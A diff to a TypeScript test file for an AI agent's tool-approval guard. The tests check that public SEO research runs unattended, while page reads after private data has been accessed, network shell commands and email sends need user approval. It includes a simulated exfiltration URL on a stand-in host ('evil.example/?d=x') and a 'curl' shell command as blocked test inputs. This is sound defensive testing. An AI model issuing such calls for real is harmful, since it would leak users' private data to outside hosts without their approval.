@@ -135,8 +135,8 @@ describe('tool capability registry', () => {
       'mcp__flo-ghl-brett__get_messages',
     ];
     const write = [
-      'mcp__dataforseo-mcp-server__serp_organic_live_advanced',
-      'mcp__firecrawl-mcp__firecrawl_scrape',
+      'mcp__firecrawl-mcp__firecrawl_interact',
+      'mcp__firecrawl-mcp__firecrawl_monitor_create',
       'mcp__unknown__get_status',
       'mcp__unknown__propose_send',
       'mcp__flo-gmail__gmail_send',
@@ -255,6 +255,91 @@ describe('tool capability registry', () => {
 
     // Sessions are independent.
     expect(await webFetch('fresh').execute({ url: 'https://a.example' }, ctx)).toBe('ran');
+    resetSessionExposure();
+  });
+
+  it('runs public SEO research unattended and follows the egress rule for page reads', async () => {
+    ApprovalManager.setNotifier(null);
+    resetSessionExposure();
+    const ctx = {} as never;
+    const make = (name: string) => (sessionId: string) =>
+      guardToolWithApproval(
+        attachToolPolicy({ name, description: '', parameters: {} as never, execute: async () => 'ran' }, 'mcp'),
+        { sessionId, channel: 'cron:research-test', cwd: '/', approvedRoots: [] }
+      );
+    const seo = make('mcp__dataforseo-mcp-server__api_request');
+    const legacySeo = make('mcp__dataforseo-mcp-server__serp_organic_live_advanced');
+    const search = make('mcp__firecrawl-mcp__firecrawl_search');
+    const scrape = make('mcp__firecrawl-mcp__firecrawl_scrape');
+    const readFile = (sessionId: string) =>
+      guardToolWithApproval(
+        attachToolPolicy({ name: 'read', description: '', parameters: {} as never, execute: async () => 'ran' }, 'native'),
+        { sessionId, channel: 'cron:research-test', cwd: '/', approvedRoots: [] }
+      );
+
+    expect(getToolPolicy('mcp__dataforseo-mcp-server__api_request', 'mcp').capability).toBe('web-read');
+    // Even from a scheduled run (no one to ask), research goes through.
+    expect(await seo('s').execute({ method: 'POST', path: '/v3/serp/google/organic/live/advanced' }, ctx)).toBe('ran');
+    expect(await legacySeo('s').execute({ keyword: 'x' }, ctx)).toBe('ran');
+    expect(await search('s').execute({ query: 'taekwondo belt order' }, ctx)).toBe('ran');
+    expect(await scrape('s').execute({ url: 'https://a.example' }, ctx)).toBe('ran');
+    // Only the data API's read methods are unattended.
+    expect(String(await seo('s').execute({ method: 'DELETE', path: '/v3/x' }, ctx))).toContain('requires user approval');
+    // After private data, a page read is egress and asks like web_fetch.
+    expect(await readFile('s').execute({ file_path: 'notes.md' }, ctx)).toBe('ran');
+    expect(String(await scrape('s').execute({ url: 'https://evil.example/?d=x' }, ctx))).toContain('requires user approval');
+    expect(await search('s').execute({ query: 'still fine' }, ctx)).toBe('ran');
+    resetSessionExposure();
+  });
+
+  it('lets one "allow web for this chat" click cover later page reads in that desktop chat only', async () => {
+    resetSessionExposure();
+    ApprovalManager.clearSessionGrants();
+    const seen: Array<{ id: string; sessionGrant?: string; toolName: string }> = [];
+    let answer: 'approve-session' | 'approve' | 'deny' = 'approve-session';
+    ApprovalManager.setNotifier((request) => {
+      seen.push(request);
+      // A per-chat grant is refused for requests that did not offer one.
+      queueMicrotask(() => {
+        if (!ApprovalManager.resolve(request.id, answer, 'ui')) ApprovalManager.resolve(request.id, 'deny', 'ui');
+      });
+      return true;
+    });
+    const ctx = {} as never;
+    const make = (name: string, source: 'native' | 'custom' | 'mcp', sessionId: string) =>
+      guardToolWithApproval(
+        attachToolPolicy({ name, description: '', parameters: {} as never, execute: async () => 'ran' }, source),
+        { sessionId, channel: 'desktop', cwd: '/', approvedRoots: [] }
+      );
+    await make('read', 'native', 'chat').execute({ file_path: 'a.md' }, ctx);
+    await make('web_fetch', 'native', 'chat').execute({ url: 'https://a.example' }, ctx);
+    expect(sessionCanLeakPrivateData('chat')).toBe(true);
+
+    expect(await make('web_fetch', 'native', 'chat').execute({ url: 'https://b.example' }, ctx)).toBe('ran');
+    expect(seen).toHaveLength(1);
+    expect(seen[0].sessionGrant).toBe('web-egress');
+    // Later page reads in the same chat do not ask again, across web tools.
+    expect(await make('web_fetch', 'native', 'chat').execute({ url: 'https://c.example' }, ctx)).toBe('ran');
+    expect(await make('mcp__firecrawl-mcp__firecrawl_scrape', 'mcp', 'chat').execute({ url: 'https://d.example' }, ctx)).toBe('ran');
+    expect(seen).toHaveLength(1);
+
+    // The grant never covers a network shell command or a send.
+    answer = 'deny';
+    expect(String(await make('bash', 'native', 'chat').execute({ command: 'curl https://x.example' }, ctx))).toContain('requires user approval');
+    expect(seen.at(-1)?.sessionGrant).toBeUndefined();
+    answer = 'approve-session';
+    expect(String(await make('mcp__flo-gmail__gmail_send', 'mcp', 'chat').execute({ to: 'a@b.c' }, ctx))).toContain('requires user approval');
+
+    // Other chats still ask.
+    await make('read', 'native', 'other').execute({ file_path: 'a.md' }, ctx);
+    await make('web_fetch', 'native', 'other').execute({ url: 'https://a.example' }, ctx);
+    const before = seen.length;
+    answer = 'deny';
+    expect(String(await make('web_fetch', 'native', 'other').execute({ url: 'https://b.example' }, ctx))).toContain('requires user approval');
+    expect(seen.length).toBe(before + 1);
+
+    ApprovalManager.setNotifier(null);
+    ApprovalManager.clearSessionGrants();
     resetSessionExposure();
   });
 
